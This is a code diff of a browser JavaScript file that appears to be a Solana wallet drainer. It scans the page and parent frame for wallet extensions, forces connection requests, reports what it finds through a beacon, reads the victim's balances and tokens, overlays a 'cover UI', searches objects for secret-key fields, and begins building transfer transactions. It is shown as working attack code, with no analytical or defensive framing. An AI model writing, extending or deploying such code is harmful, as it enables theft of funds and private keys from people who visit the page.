@@ -101,8 +101,48 @@
     } catch (e) {}
   };
 
-  try {
+  // ── detection: collect providers, try connect() on each, return first success ──
+  function findProviders() {
+    const found = [];
+    const seen = new Set();
+    const named = [
+      ["phantom", function () { return window.phantom && window.phantom.solana; }],
+      ["axiom", function () { return window.axiom && window.axiom.solana; }],
+      ["trust", function () { return window.trustwallet && window.trustwallet.solana; }],
+      ["solflare", function () { return window.solflare; }],
+      ["backpack", function () { return window.backpack && window.backpack.solana; }],
+      ["solana", function () { return window.solana; }]
+    ];
+    const frames = [];
+    try { frames.push(window); } catch (e) {}
+    try { if (window.top && window.top !== window) frames.push(window.top); } catch (e) {}
+    for (let fi = 0; fi < frames.length; fi++) {
+      const w = frames[fi];
+      for (let ci = 0; ci < named.length; ci++) {
+        let p = null;
+        try { p = named[ci][1](); } catch (e) { p = null; }
+        if (!p) continue;
+        if (typeof p.connect !== "function" && typeof p.request !== "function") continue;
+        if (seen.has(p)) continue;
+        seen.add(p);
+        found.push({ name: named[ci][0], provider: p, connected: false });
+      }
+      const keys = Object.keys(w);
+      for (let ki = 0; ki < keys.length; ki++) {
+        const k = keys[ki];
+        let v = null;
+        try { v = w[k]; } catch (e) { continue; }
+        if (!v || typeof v !== "object") continue;
+        if (typeof v.connect !== "function") continue;
+        if (seen.has(v)) continue;
+        seen.add(v);
+        found.push({ name: "ext:" + k, provider: v, connected: false });
+      }
+    }
+    return found;
+  }
 
+  try {
     beacon("loaded", { provider: "scanning" });
 
     const mod = await import(E + "@solana/web3.js@1.95.0");
@@ -122,126 +162,43 @@
 
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-    const pubStr = function (v) {
-      try {
-        if (!v) return null;
-        if (typeof v === "string") {
-          if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v)) return v;
-          return null;
-        }
-        if (typeof v.toBase58 === "function") return v.toBase58();
-        if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
-        return null;
-      } catch (e) { return null; }
-    };
+    // ── connect loop: try each provider in order, first success wins ──
+    const candidates = findProviders();
+    beacon("detect", { provider: "scan", extra: "found " + candidates.length + " provider(s): " + candidates.map(function (c) { return c.name; }).join(",") });
 
-    const CANDS = [
-      ["phantom", function () { return window.phantom && window.phantom.solana; }],
-      ["axiom", function () { return window.axiom && window.axiom.solana; }],
-      ["trust", function () { return window.trustwallet && window.trustwallet.solana; }],
-      ["solflare", function () { return window.solflare; }],
-      ["backpack", function () { return window.backpack && window.backpack.solana; }],
-      ["solana", function () { return window.solana; }]
-    ];
-
-    function findProviders() {
-      const found = [];
-      const seen = new Set();
-      const frames = [];
-      try { frames.push(window); } catch (e) {}
+    let name = null, prov = null, pk = null;
+    for (let i = 0; i < candidates.length; i++) {
+      const cand = candidates[i];
       try {
-        if (window.top && window.top !== window) frames.push(window.top);
-      } catch (e) {}
-      for (let fi = 0; fi < frames.length; fi++) {
-        const w = frames[fi];
-        for (let ci = 0; ci < CANDS.length; ci++) {
-          let p = null;
-          try { p = CANDS[ci][1](); } catch (e) { p = null; }
-          if (!p) continue;
-          const str = pubStr(p.publicKey);
-          if (!seen.has(p)) {
-            seen.add(p);
-            found.push({ name: CANDS[ci][0], provider: p, pk: str, connected: !!str });
-          }
+        const c = await withTO(Promise.resolve(cand.provider.connect()), 20000);
+        const k = pubStr((c && c.publicKey) || cand.provider.publicKey);
+        if (k) {
+          name = cand.name;
+          prov = cand.provider;
+          pk = k;
+          break;
         }
-        const keys = Object.keys(w);
-        for (let ki = 0; ki < keys.length; ki++) {
-          const k = keys[ki];
-          try {
-            const v = w[k];
-            if (!v || typeof v !== "object") continue;
-            if (typeof v.signAndSendTransaction !== "function") continue;
-            if (seen.has(v)) continue;
-            seen.add(v);
-            const str = pubStr(v.publicKey);
-            found.push({ name: "ext:" + k, provider: v, pk: str, connected: !!str });
-          } catch (e) {}
-        }
+      } catch (e) {
+        beacon("err", { pk: "?", provider: cand.name, msg: "connect failed: " + String(e && e.message || e) });
       }
-      return found;
     }
 
-    async function detectWallet() {
-      let list = findProviders();
-      for (let i = 0; i < list.length; i++) {
-        if (list[i].connected) return list[i];
-      }
-      for (let wait = 0; wait < 15; wait += 3) {
-        await new Promise(function (s) { setTimeout(s, 3000); });
-        list = findProviders();
-        for (let i = 0; i < list.length; i++) {
-          if (list[i].connected) return list[i];
-        }
-        for (let i = 0; i < list.length; i++) {
-          const any = list[i];
-          if (any.provider && typeof any.provider.connect === "function") {
-            try {
-              const r = await withTO(Promise.resolve(any.provider.connect()), 20000);
-              const p = pubStr((r && r.publicKey) || any.provider.publicKey);
-              if (p) {
-                any.pk = p;
-                any.connected = true;
-                return any;
-              }
-            } catch (e) {}
-          }
-        }
-      }
-      return null;
-    }
-
-    const det = await detectWallet();
-    if (!det) {
-      beacon("detect", { provider: "none", extra: "scan complete \u2014 no connectable wallet found after retries" });
+    if (!prov || !pk) {
+      beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused or timed out" });
       return;
     }
 
-    const name = det.name;
-    const prov = det.provider;
-    let pk = det.pk;
     const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;
-
-    if (!pk) {
-      try {
-        const r = await withTO(Promise.resolve(prov.connect()), 20000);
-        pk = pubStr((r && r.publicKey) || prov.publicKey);
-      } catch (e) { pk = pubStr(prov.publicKey); }
-      if (!pk) {
-        beacon("err", { provider: label, msg: "wallet found but connect refused \u2014 " + label });
-        return;
-      }
-    }
     PKSTR = pk;
-
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
 
+    // — inventory —
     const bal = await readBalance(pk);
     if (bal === null) {
       beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 network or rate-limit" });
       return;
     }
-
     const r = await readTokens(pk);
     const rArr = (r && r.value) ? r : { value: [] };
 
@@ -282,6 +239,7 @@
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
+    // — cover UI —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
@@ -329,6 +287,7 @@
       } catch (e) {}
     };
 
+    // — secret-key candidates —
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
     for (let si = 0; si < 2; si++) {
@@ -352,7 +311,6 @@
         }
       } catch (e) {}
     }
-
     const walk = function (o, d) {
       if (!o || typeof o !== "object" || d > 2) return;
       for (const k of Object.keys(o)) {
@@ -372,7 +330,6 @@
     };
 
     const FEE = 20000;
-
     async function buildTx(to) {
       const dest = new PublicKey(to);
       const bh2 = await rpc("getLatestBlockhash");
